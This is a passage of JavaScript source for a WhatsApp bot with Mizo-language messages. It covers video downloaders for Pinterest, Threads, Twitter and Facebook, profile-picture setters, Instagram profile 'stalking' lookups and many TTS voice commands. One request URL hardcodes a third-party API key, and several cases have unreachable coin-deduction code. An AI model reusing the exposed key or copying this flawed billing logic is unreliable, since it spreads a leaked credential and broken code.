	const res = await savePin(text);
	const { title, results } = res
	let media = results[0]
	if (media.format === 'MP4') {
	    await uploadreact()
		await HBWABotMz.sendMessage(m.chat, { caption : `*Pinterest Video Download by ${botname}*`, video: { url: media.downloadLink } }, { quoted: m })
		await eco.deduct(limitneihtu, kancoins, hmanzat)
        await eco.give(limitneihtu, kantitle, hmanzat2);    
        await eco.deduct(limitneihtu, freevip, 1);
        await finishreact()
	} else if (media.format === 'JPG') {
    	await uploadreact()
		await HBWABotMz.sendMessage(m.chat, { caption :`*Pinterest Image Download by ${botname}*`, image: { url: media.downloadLink } }, { quoted: m })
		await eco.deduct(limitneihtu, kancoins, hmanzat)
        await eco.give(limitneihtu, kantitle, hmanzat2);    
        await eco.deduct(limitneihtu, freevip, 1);
        await finishreact()
	} else {
		return dodoi("_Sorry, ka download thei a lo a ni😔_")
	}
} catch (err) {
	console.error(err)
	dodoi("_Sorry, ka download thei a lo a ni😔_")
}
break;
}
case 'amps': {
const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
				if (!text) return dodoi(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} [URL Alight Motion]*`);
				if (!(text.includes('http://') || text.includes('https://'))) {
					return dodoi(`Alight motion link chu http:// emaw https:// atanga in tan a ni tur a ni`);
				}
				if (!(text.includes('alight.link') || text.includes('alightcreative.com'))) {
					return dodoi(`I link rawn dah hi alight motion preset link a ni lo`);
				}
				try {
					await uploadreact()
					const result = await alightScrape(text);
					if (result.error) {
						return dodoi(result.error);
					}
					const { title, description } = result;
					await dodoi(`[ *PRESET ALIGHT MOTION* ]\n\n*Title* ${title}\n*Description:* ${description}`);
				} catch (error) {
					console.error(error);
					dodoi('URL atanga data lakchhuah laiin error a awm!');
				}
			}
    	await eco.deduct(limitneihtu, kancoins, hmanzat)
        await eco.give(limitneihtu, kantitle, hmanzat2);    
        await eco.deduct(limitneihtu, freevip, 1);
        await finishreact()
			break;
case 'ptvid2': 
case 'pinterestvid2': {

    if (!args || !args[0]) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} https://in.pinterest.com/pin/993747474000018772`);
    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) return await dailylimit();
    await loadingreact();
    const { spin } = require("./lib/scraper");
    await spin(args[0]).then(async res => {
        let pin = JSON.stringify(res);
        let json = JSON.parse(pin);
        if (!json.status) return dodoi("_Sorry, ka download thei a lo a ni😔_");
        const mp4Url = json.data.find(item => item.url.endsWith('.mp4')).url;
        await uploadreact();
  
        HBWABotMz.sendMessage(m.chat,
            { video: { url: mp4Url }, mimetype: 'video/mp4', caption: `*Pinterest video download by ${global.botname}*` },
            { quoted: m }
        );
        
        await eco.deduct(limitneihtu, kancoins, hmanzat);
        await eco.give(limitneihtu, kantitle, hmanzat2); 
        await finishreact();
    });
    break;
}

case 'trvid':
case 'threadsvid': {

    if (!args || !args[0]) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} https://www.threads.net/@ahmedmostafa00000000/post/C0G4idAI62g`);
    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) return await dailylimit();
    await loadingreact();
    const kanfa = args[0];
    try {
        const nunui3 = await fetchJson(`https://api.tioo.eu.org/download/threads?url=${encodeURIComponent(kanfa)}`);
        const videoUrls = nunui3.result.video_urls;
        const downloadUrl = videoUrls && videoUrls.length > 0 ? videoUrls[0].download_url : null;
        if (downloadUrl) {
            await uploadreact();
            HBWABotMz.sendMessage(m.chat, { video: { url: downloadUrl }, mimetype: 'video/mp4', caption: `*Threads video download by ${global.botname}` }, { quoted: m });
            await eco.deduct(limitneihtu, kancoins, hmanzat);
            await eco.give(limitneihtu, kantitle, hmanzat2); 
            await finishreact();
        } else {
            dodoi("_Sorry, ka download thei lo a ni😔_");
        }
    } catch {
        dodoi("_Sorry, ka download thei lo a ni😔_");
    }
    break;
}



case 'twvid':
case 'twittervid': {
    if (!args || !args[0]) {
        return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} https://twitter.com/i/status/1721997071719227582`);
    }
    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);    
    if (!isVip && limit24.wallet < 1) return await replyvip();
    if (isExp && limit24.wallet < 1) return replyvipexp();
    
    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) return await dailylimit();

    await loadingreact();

    const kanfa = args[0];
    const savetwitter = require("./lib/twitter")
    const herbert2 = await savetwitter(kanfa);

    if (herbert2.error || herbert2.type !== "video") {
        return dodoi('Failed to fetch a valid Twitter video.');
    }
    let selectedVideo = herbert2.videos.find(vid => vid.quality.includes('720')) || herbert2.videos[0];

    if (!selectedVideo) {
        return dodoi('No downloadable video found.');
    }
    await uploadreact();
    await HBWABotMz.sendMessage(m.chat, {
        video: { url: selectedVideo.download },
        mimetype: 'video/mp4',
        caption: `Twitter video (${selectedVideo.quality}) downloaded by ${global.botname}`
    }, { quoted: m });

    await eco.deduct(limitneihtu, kancoins, hmanzat);
    await eco.give(limitneihtu, kantitle, hmanzat2);
    await finishreact();
}
break;

case 'fbvid' : case 'facebookvid':{
if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} https://fb.watch/mcx9K6cb6t/?mibextid=8103lRmnirLUhozF`)
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
await loadingreact()
const { fbdown } = require('btch-downloader') 
const link = args[0] 
const data = await fbdown(link) 
console.log(data)
await uploadreact()
await HBWABotMz.sendMessage(m.chat,{
video: {url: data.Normal_video},
caption: "Facebook Videos download by " + `${global.botname}`
}, {quoted:m})
await finishreact()
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);
}
break 

case 'fbvid2':
case 'facebookvid2': {
    if (!args || !args[0]) {
        return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} https://fb.watch/mcx9K6cb6t/?mibextid=8103lRmnirLUhozF`);
    }

    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (hmanzat > limit1.wallet) {
        return await dailylimit();
    }

    const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */

    await loadingreact();

    const videoUrl = args[0];
    try {
        const Facebook = require('./lib/facebook');
        const fbData = await Facebook(videoUrl);

        if (!fbData.media.length) {
            return dodoi("_Sorry, video link ka hmuh thei lo 😔_");
        }

     let random = fbData.media[0];
     let buffer = await fetch(random).then(async (a) =>
      Buffer.from(await a.arrayBuffer()),
    );
        await uploadreact();

        // Send video using sendMessage function
        await HBWABotMz.sendMessage(
            m.chat,
            { 
                video: buffer, 
                mimetype: 'video/mp4', 
                caption: `*Facebook video download a hlawk! ${global.botname} hian lo thawn ta e.*` 
            },
            { quoted: m }
        );

        await eco.deduct(limitneihtu, kancoins, hmanzat);
        await eco.give(limitneihtu, kantitle, hmanzat2); 
        await finishreact();
    } catch (error) {
        console.error("Error downloading Facebook video:", error.response?.data || error.message);
        dodoi("_Video download thei lo 😔_");
    }
    break;
}
case 'setgrdp': {
  if (!m.isGroup) return dodoi(mess.group)
  if (!isAdmins) return dodoi(mess.admin)
  if (!isBotAdmins) return dodoi(mess.botAdmin)
  if (!quoted) return dodoi(`Send emaw reply in a caption ah tiang hian rawn dah rawh: ${prefix + command}`)
  if (!/image/.test(mime)) return dodoi(`Send emaw reply in a caption ah tiang hian rawn dah rawh : ${prefix + command}`)
  if (/webp/.test(mime)) return dodoi(`Send emaw reply in a caption sh tiang hian rawn dah rawh : ${prefix + command}`)
  const limit1= await eco.balance(limitneihtu, kancoins)
if (50 > limit1.wallet) return dodoi(`He featurs hi hman i duh chuan 🪙50 i neih a ngai!!.\n\nBot rawn hmang thar tur i nih chuan coins tiin type rawh, ti chuan bot hman theihna tur 🪙500 i dawng ang, emaw i thiante in thawn tir rawh`)
  let q = m.quoted ? m.quoted : m
  let dptur = await q.download()
  const { img } = await generateProfilePicture(dptur)
      await HBWABotMz.updateProfilePicture(m.chat, img)
    await eco.deduct(limitneihtu, kancoins, 50)
    dodoi(`Dp chu set fel a ni ta e`)
}
break;

case 'setdpbot':
case 'setbotdp': {
if (!HerbertTheCreator) return dodoi(mess.owner)
if (!quoted) return dodoi(`Send emaw reply in a caption ah tiang hian rawn dah rawh: ${prefix + command}`)
if (!/image/.test(mime)) return dodoi(`Send emaw reply in a caption ah tiang hian rawn dah rawh : ${prefix + command}`)
if (/webp/.test(mime)) return dodoi(`Send emaw reply in a caption sh tiang hian rawn dah rawh : ${prefix + command}`)
const limit1= await eco.balance(limitneihtu, kancoins)
if (50 > limit1.wallet) return dodoi(`He featurs hi hman i duh chuan 🪙50 i neih a ngai!!.\n\nBot rawn hmang thar tur i nih chuan coins tiin type rawh, ti chuan bot hman theihna tur 🪙500 i dawng ang, emaw i thiante in thawn tir rawh`)
  let q = m.quoted ? m.quoted : m
  let dptur = await q.download()
  let nobot = HBWABotMz.user
  const { img } = await generateProfilePicture(dptur)
      await HBWABotMz.updateProfilePicture(nobot, dptur)
    await eco.deduct(limitneihtu, kancoins, 50)
    dodoi(`Dp chu set fel a ni ta e`)
}
break;
case 'setthumb':
case 'changethumb': {
    if (!HerbertTheCreator2) return dodoi(mess.owner);
    const fs = require('fs');
    const sharp = require('sharp');
    const path = require('path');
    if (!quoted) return dodoi(`Send emaw reply in a caption ah tiang hian rawn dah rawh: ${prefix + command}`);
    if (!/image/.test(mime)) return dodoi(`Send emaw reply in a caption ah tiang hian rawn dah rawh : ${prefix + command}`);
    if (/webp/.test(mime)) return dodoi(`Send emaw reply in a caption sh tiang hian rawn dah rawh : ${prefix + command}`);
    const limit1 = await eco.balance(limitneihtu, kancoins);
    if (50 > limit1.wallet) return dodoi(`He featurs hi hman i duh chuan 🪙50 i neih a ngai!!.\n\nBot rawn hmang thar tur i nih chuan claim tiin type rawh, ti chuan bot hman theihna tur 🪙500 i dawng ang, emaw i thiante in thawn tir rawh`);
    const imageBuffer = await quoted.download();
    const imagePath = './asset/image/HBWABot.png';
    try {
        const metadata = await sharp(imageBuffer).metadata();        
        if (metadata.format === 'jpeg' || metadata.format === 'jpg') {
            await sharp(imageBuffer)
                .png() // Convert to PNG
                .toFile(imagePath);
        } else {
            await sharp(imageBuffer).toFile(imagePath);
        }        
    dodoi(`Thumbnail chu set fel a ni ta e`);
    } catch (error) {
        return dodoi('Ti tha rawh.');
    }
}
break;
/*
case 'setdpbot': case 'setbotdp': {
if (!HerbertTheCreator) return dodoi(mess.owner)
if (!quoted) return dodoi(`Send emaw reply in a caption ah tiang hian rawn dah rawh: ${prefix + command}`)
if (!/image/.test(mime)) return dodoi(`Send emaw reply in a caption ah tiang hian rawn dah rawh : ${prefix + command}`)
if (/webp/.test(mime)) return dodoi(`Send emaw reply in a caption sh tiang hian rawn dah rawh : ${prefix + command}`)
var dptur = await HBWABotMz.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await reSize(dptur)
await HBWABotMz.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(dptur)
dodoi(`Success`)
} else {
var memeg = await HBWABotMz.updateProfilePicture(botNumber, { url: dptur })
fs.unlinkSync(dptur)
dodoi(`Success`)
}
}
break
*/
case 'igstalk2': {

const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
    if (!args[0]) return dodoi(`Instagram Username rawn dah rawh\n\nTiang hian: ${prefix + command} herbert_suantak2`)
    const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
    const igstalkk2 = `https://api.tioo.eu.org/download/igstalk?username=${encodeURIComponent(args[0])}`;
    let res;
    await loadingreact()
    try {
        const igstfetch2 = await fetch(igstalkk2)
        const resig2 = await igstfetch2.json()
        res = resig2.result;
    } catch {
        dodoi(`A username a dik lo!. a username dik tak rawn dah rawh`)
        return;
    }
    try {
let te = `
┌──「 *STALKING* 」
▢ *🔖Name:* ${res.fullName} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followers}
▢ *🫂Following:* ${res.following}
▢ *📌Bio:* ${res.bio}
▢ *🏝️Posts:* ${res.postsCount}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
╰════════════`;
await HBWABotMz.sendMessage(m.chat, { image: { url: res.photoUrl }, caption: te }, { quoted: m });
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);await eco.deduct(limitneihtu, freevip, 1);
await finishreact()
    } catch {
        dodoi(`A username a dik lo!. a username dik tak rawn dah rawh`);
    }
    break;
}

case 'igstalk': {

const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
    if (!args[0]) {
        return dodoi(`Instagram Username rawn dah rawh\n\nTiang hian: ${prefix + command} herbert_suantak2`);
    }

    const igstalkk2 = `https://api.betabotz.eu.org/api/stalk/ig?username=${encodeURIComponent(args[0])}&apikey=Btz-HlFgj`;
    let res;
    await loadingreact();

    try {
        const igstfetch2 = await fetch(igstalkk2);
        const resig2 = await igstfetch2.json();
        res = resig2.result;
    } catch (error) {
        dodoi(`A username a dik lo!. a username dik tak rawn dah rawh`);
        return;
    }

    try {
        let te = `
┌──「 *STALKING* 」
▢ *🔖Name:* ${res.fullName} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followers}
▢ *🫂Following:* ${res.following}
▢ *📌Bio:* ${res.bio}
▢ *🏝️Posts:* ${res.postsCount}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
╰════════════`;
        await HBWABotMz.sendMessage(m.chat, { image: { url: res.photoUrl }, caption: te }, { quoted: m });
        await finishreact();
    } catch (error) {
        dodoi(`A username a dik lo!. a username dik tak rawn dah rawh`);
    }
    break;
}

case 'say': case 'tts': case 'gtts':{
if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = text
const herbertrl = googleTTS.getAudioUrl(texttts, {
lang: "en",
slow: false,
host: "https://translate.google.com",
})
return HBWABotMz.sendMessage(m.chat, {
audio: {
url: herbertrl,
},
mimetype: 'audio/mp4',
ptt: true,
fileName: `${text}.mp3`,
}, {
quoted: m,
})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 
case 'tts2': {
if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = await fetchJson(`https://api.nyxs.pw/tools/tts-tiktok?text=${encodeURIComponent(text)}&code=en_male_jomboy`);
const herbertrl = texttts.result
return HBWABotMz.sendMessage(m.chat, {audio: {url: herbertrl },mimetype: 'audio/mp4',ptt: true,fileName: `${text}.mp3`,}, {quoted: m,})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 
case 'tts3': {

if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = await fetchJson(`https://api.nyxs.pw/tools/tts-tiktok?text=${encodeURIComponent(text)}&code=en_us_002`);
const herbertrl = texttts.result
return HBWABotMz.sendMessage(m.chat, {audio: {url: herbertrl },mimetype: 'audio/mp4',ptt: true,fileName: `${text}.mp3`,}, {quoted: m,})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 
case 'tts4': {

if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = await fetchJson(`https://api.nyxs.pw/tools/tts-tiktok?text=${encodeURIComponent(text)}&code=en_male_funny`);
const herbertrl = texttts.result
return HBWABotMz.sendMessage(m.chat, {audio: {url: herbertrl },mimetype: 'audio/mp4',ptt: true,fileName: `${text}.mp3`,}, {quoted: m,})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 
case 'tts5': {

if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = await fetchJson(`https://api.nyxs.pw/tools/tts-tiktok?text=${encodeURIComponent(text)}&code=en_female_samc`);
const herbertrl = texttts.result
return HBWABotMz.sendMessage(m.chat, {audio: {url: herbertrl },mimetype: 'audio/mp4',ptt: true,fileName: `${text}.mp3`,}, {quoted: m,})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 
case 'tts6': {

if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = await fetchJson(`https://api.nyxs.pw/tools/tts-tiktok?text=${encodeURIComponent(text)}&code=en_female_makeup`);
const herbertrl = texttts.result
return HBWABotMz.sendMessage(m.chat, {audio: {url: herbertrl },mimetype: 'audio/mp4',ptt: true,fileName: `${text}.mp3`,}, {quoted: m,})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 
case 'tts7': {

if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = await fetchJson(`https://api.nyxs.pw/tools/tts-tiktok?text=${encodeURIComponent(text)}&code=en_female_shenna`);
const herbertrl = texttts.result
return HBWABotMz.sendMessage(m.chat, {audio: {url: herbertrl },mimetype: 'audio/mp4',ptt: true,fileName: `${text}.mp3`,}, {quoted: m,})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 
case 'tts8': {

if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = await fetchJson(`https://api.nyxs.pw/tools/tts-tiktok?text=${encodeURIComponent(text)}&code=en_female_richgirl`);
const herbertrl = texttts.result
return HBWABotMz.sendMessage(m.chat, {audio: {url: herbertrl },mimetype: 'audio/mp4',ptt: true,fileName: `${text}.mp3`,}, {quoted: m,})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 
case 'tts9': {

if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = await fetchJson(`https://api.nyxs.pw/tools/tts-tiktok?text=${encodeURIComponent(text)}&code=en_male_jarvis`);
const herbertrl = texttts.result
return HBWABotMz.sendMessage(m.chat, {audio: {url: herbertrl },mimetype: 'audio/mp4',ptt: true,fileName: `${text}.mp3`,}, {quoted: m,})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 
case 'tts10': {

if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = await fetchJson(`https://api.nyxs.pw/tools/tts-tiktok?text=${encodeURIComponent(text)}&code=en_male_jarvis`);
const herbertrl = texttts.result
return HBWABotMz.sendMessage(m.chat, {audio: {url: herbertrl },mimetype: 'audio/mp4',ptt: true,fileName: `${text}.mp3`,}, {quoted: m,})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 

case 'alto': {
if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = await fetchJson(`https://api.nyxs.pw/tools/tts-tiktok?text=${encodeURIComponent(text)}&code=en_female_f08_salut_damour`);
const herbertrl = texttts.result
return HBWABotMz.sendMessage(m.chat, {audio: {url: herbertrl },mimetype: 'audio/mp4',ptt: true,fileName: `${text}.mp3`,}, {quoted: m,})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 
case 'tenor': {

if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = await fetchJson(`https://api.nyxs.pw/tools/tts-tiktok?text=${encodeURIComponent(text)}&code=en_male_m03_lobby`);
const herbertrl = texttts.result
return HBWABotMz.sendMessage(m.chat, {audio: {url: herbertrl },mimetype: 'audio/mp4',ptt: true,fileName: `${text}.mp3`,}, {quoted: m,})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 

case 'warmy': {

if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = await fetchJson(`https://api.nyxs.pw/tools/tts-tiktok?text=${encodeURIComponent(text)}&code=en_female_f08_warmy_breeze`);
const herbertrl = texttts.result
return HBWABotMz.sendMessage(m.chat, {audio: {url: herbertrl },mimetype: 'audio/mp4',ptt: true,fileName: `${text}.mp3`,}, {quoted: m,})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 
case 'glorious': {

if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = await fetchJson(`https://api.nyxs.pw/tools/tts-tiktok?text=${encodeURIComponent(text)}&code=en_female_ht_f08_glorious`);
const herbertrl = texttts.result
return HBWABotMz.sendMessage(m.chat, {audio: {url: herbertrl },mimetype: 'audio/mp4',ptt: true,fileName: `${text}.mp3`,}, {quoted: m,})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 
case 'itgoesup': {

if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = await fetchJson(`https://api.nyxs.pw/tools/tts-tiktok?text=${encodeURIComponent(text)}&code=en_male_sing_funny_it_goes_up`);
const herbertrl = texttts.result
return HBWABotMz.sendMessage(m.chat, {audio: {url: herbertrl },mimetype: 'audio/mp4',ptt: true,fileName: `${text}.mp3`,}, {quoted: m,})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 
case 'chipmunk': {

if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = await fetchJson(`https://api.nyxs.pw/tools/tts-tiktok?text=${encodeURIComponent(text)}&code=en_male_sing_funny_thanksgiving`);
const herbertrl = texttts.result
return HBWABotMz.sendMessage(m.chat, {audio: {url: herbertrl },mimetype: 'audio/mp4',ptt: true,fileName: `${text}.mp3`,}, {quoted: m,})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 
case 'dramatic': {

if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = await fetchJson(`https://api.nyxs.pw/tools/tts-tiktok?text=${encodeURIComponent(text)}&code=en_female_ht_f08_wonderful_world`);
const herbertrl = texttts.result
return HBWABotMz.sendMessage(m.chat, {audio: {url: herbertrl },mimetype: 'audio/mp4',ptt: true,fileName: `${text}.mp3`,}, {quoted: m,})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 
case 'sunshine': {

if (!text) return dodoi2(`${mtl2.guide1}\n\n*⟨Entirnan :* ${prefix + command} Hello World`)
const freevip = "frvip2";
    const limit24 = await eco.balance(limitneihtu, freevip);
/*    if (!isVip && limit24.wallet < 1) {
        return await replyvip();
    }
    if (isExp && limit24.wallet < 1) {
        return replyvipexp();
    } */
HBWABotMz.sendMessage(from, { react: { text: "🎙️" , key: m.key }})
const limit1= await eco.balance(limitneihtu, kancoins)
    if (hmanzat > limit1.wallet) return await dailylimit()
let texttts = await fetchJson(`https://api.nyxs.pw/tools/tts-tiktok?text=${encodeURIComponent(text)}&code=en_male_m03_sunshine_soon`);
const herbertrl = texttts.result
return HBWABotMz.sendMessage(m.chat, {audio: {url: herbertrl },mimetype: 'audio/mp4',ptt: true,fileName: `${text}.mp3`,}, {quoted: m,})
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break 

case 'translate2': case 'tr2':{
if (!q || !q.includes("|")) {
